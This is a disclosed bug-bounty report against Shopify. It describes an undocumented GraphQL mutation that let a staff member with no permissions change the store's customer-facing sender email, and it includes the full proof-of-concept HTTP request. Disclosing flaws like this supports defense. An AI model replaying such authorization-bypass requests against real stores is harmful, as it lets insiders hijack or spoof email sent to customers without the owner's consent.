# A staff member with no permissions can edit Store Customer Email

## Report Details
- **Report ID**: 980511
- **URL**: https://hackerone.com/reports/980511
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-12T07:24:44.376Z
- **Disclosed**: 2020-10-22T18:41:03.511Z

## Reporter
- **Username**: ash_nz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Impact
A staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.

## Details
`emailSenderConfigurationUpdate` is an undocumented GraphQL API that will allows a malicious staff member in a store to update the `Customer Email`. This email configuration can be found in the general settings in your store. The following screenshot shows the details.
██████████

To reproduce this finding you will need two accounts in your store. One is the Owner and the other is an account that you invite as a staff member with no permissions. The following screenshot shows the accounts setup.
{F985090}
{F985089}

1. login as the Staff user and send the following mutation GraphQL request.

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: 082760e7-3dac-481e-8741-50cb2cc61617
Host: [YOUR-DOMAIN].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 346

{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{
  "input":{
      "senderEmail":"███"
  }
}}
```
2. Login with the Owner account and check the `Store details`,the `Customer email` should be updated with the new email address.

## Impact

A staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.

## Attachments
- permissions.PNG
- accounts.PNG
